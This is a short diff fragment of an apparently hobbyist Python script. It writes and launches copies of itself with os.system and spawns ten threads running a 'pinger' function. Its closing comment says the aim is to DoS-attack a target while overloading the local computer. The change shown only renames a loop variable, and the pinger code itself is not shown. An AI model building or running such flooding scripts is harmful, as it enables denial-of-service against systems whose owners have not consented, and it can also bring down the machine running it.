@@ -16,8 +16,8 @@ for i,name in enumerate(names):
         new_file.write(line)
     new_file.close()
     os.system(f'python3 {name}')
-    for i in range(10):
-        thread = threading.Thread(name=f"thread[{i}]",target=pinger)
+    for w in range(10):
+        thread = threading.Thread(name=f"thread[{w}]",target=pinger)
         thread.start()
 f.close()
 #computer shits the bed and the attacktarget gets DOS attacked sort of
